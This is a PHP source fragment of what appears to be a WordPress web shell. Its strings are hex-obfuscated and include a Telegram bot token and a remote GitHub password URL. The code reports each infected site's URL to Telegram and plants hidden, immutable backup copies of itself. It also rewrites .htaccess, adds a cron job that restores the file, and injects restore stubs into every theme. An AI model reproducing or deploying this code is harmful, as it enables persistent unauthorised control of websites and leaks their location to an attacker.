...
function h($s){$r='';for($i=0;$i<strlen($s);$i+=2)$r.=chr(hexdec(substr($s,$i,2)));return $r;}

$__A=h('373530373133383936363a4141476c4f4850477974753870536d70745544374d697a35724e37363536395f455373');
$__B=h('393836333035383732');
$__C=h('68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6170706f6c61696f2f746572696d616b6962757372612f726566732f68656164732f6d61696e2f61626573616c652e747874');
$__D=h('63333862313866303535643131356335333565313133663538333734383437343263643366396538333639646138663030653462653734376535313364373739');
$__E=h('68747470733a2f2f6170692e74656c656772616d2e6f72672f626f74');
$__F=h('2f73656e644d6573736167653f636861745f69643d');
$__G=h('26746578743d');
$__H=h('2664697361626c655f6e6f74696669636174696f6e3d312670617273655f6d6f64653d48544d4c');

// ===== TELEGRAM NOTIFIER (Rate Limited + File Lock = NO double send) =====
$__TGLINK='https://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
$__RATE='/tmp/'.md5($_SERVER['REMOTE_ADDR']).'.txt';
$__LK='/tmp/'.md5($_SERVER['REMOTE_ADDR']).'.lock';
$__FP=@fopen($__LK,'c');
if($__FP && @flock($__FP,LOCK_EX|LOCK_NB)){
    $__SEND=true;
    if(file_exists($__RATE)){
        if((time()-intval(file_get_contents($__RATE)))<86400)$__SEND=false;
    }
    if($__SEND){
        $url=$__E.$__A.$__F.$__B.$__G.urlencode($__TGLINK).$__H;
        ...
        file_put_contents($__RATE,time());
    }
    flock($__FP,LOCK_UN);fclose($__FP);
}
// =========================================================

$__J=__FILE__;$__K=file_get_contents($__J);$__L=basename($__J);$__M=$_SERVER['DOCUMENT_ROOT'];$__N=base64_encode($__K);

// Backup copies
$__O=[$__J,$__M.'/wp-content/uploads/.'.$__L,$__M.'/wp-includes/.'.$__L,'/tmp/.'.$__L];
foreach($__O as $__P){
    if(!file_exists($__P)||!filesize($__P)){
        @file_put_contents($__P,base64_decode($__N));
        @chmod($__P,0444);
        if(function_exists('exec'))@exec("chattr +i ".escapeshellarg($__P));
    }
}

// .htaccess — stealth multi-method approach
$__Q=$__M.'/.htaccess';
$__PAT=substr($__L,0,4);
$__RULES=[
    "\n<FilesMatch \"".$__PAT."\">\nSatisfy Any\n</FilesMatch>\n",
    "\n<Files \"".$__L."\">\nOrder allow,deny\nAllow from all\n</Files>\n",
    "\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteRule ^".$__PAT." - [L]\n</IfModule>\n"
];
$__S=@file_get_contents($__Q);
if($__S!==false){
    if(strpos($__S,'Satisfy Any')===false&&strpos($__S,'Allow from all')===false&&strpos($__S,'mod_rewrite')===false){
        foreach($__RULES as $__RX){
            @file_put_contents($__Q,$__RX.$__S);
            if(function_exists('exec'))@exec("chattr +i ".escapeshellarg($__Q));
            break;
        }
    }
} elseif(is_writable($__M)){
    foreach($__RULES as $__RX){
        @file_put_contents($__Q,$__RX);
        if(function_exists('exec'))@exec("chattr +i ".escapeshellarg($__Q));
        break;
    }
}

// LAYER 1: System Cron (tries first)
if(function_exists('shell_exec')&&function_exists('exec')){
    $__T1=md5($_SERVER['HTTP_HOST']);
    $__U=@shell_exec("crontab -l 2>/dev/null");
    if($__U!==null&&$__U!==false&&strpos($__U,$__T1)===false){
        $__V="* * * * * if [ ! -f ".escapeshellarg($__J)." ]; then echo ".escapeshellarg($__N)." | base64 -d > ".escapeshellarg($__J)."; chmod 0755 ".escapeshellarg($__J)."; fi #".$__T1;
        $__W='/tmp/.'.$__T1;file_put_contents($__W,$__U.PHP_EOL.$__V.PHP_EOL);
        @exec("crontab ".escapeshellarg($__W));@unlink($__W);
    }
}

// LAYER 2: Theme files (ALL themes, first writable file each)
$__TD=$__M.'/wp-content/themes';
if(is_dir($__TD)){
    $__TM=@glob($__TD.'/*',GLOB_ONLYDIR);
    if($__TM){
        foreach($__TM as $__TH){
            $__TF=[$__TH.'/functions.php',$__TH.'/header.php',$__TH.'/footer.php',$__TH.'/index.php'];
            foreach($__TF as $__TP){
                if(file_exists($__TP)&&is_writable($__TP)){
                    $__TC=file_get_contents($__TP);
                    if($__TC!==false&&strpos($__TC,'/*wpt*/')===false){
                        $__STUB="<?php /*wpt*/ if(!@file_exists('".$__J."')&&@file_exists('".$__M."/wp-content/uploads/.".$__L."')){@copy('".$__M."/wp-content/uploads/.".$__L."','".$__J."');} /*wpt*/ ?>\n";
                        @file_put_contents($__TP,$__STUB.$__TC);
                    }
                    break;
                }
            }
...
if(isset($_GET['cmd'])&&$_GET['cmd']==='setup_persist'){die();}
$__Z2=@file_get_contents($__C);
$auth_pass=($__Z2!==false&&!empty(trim($__Z2)))?trim($__Z2):$__D;
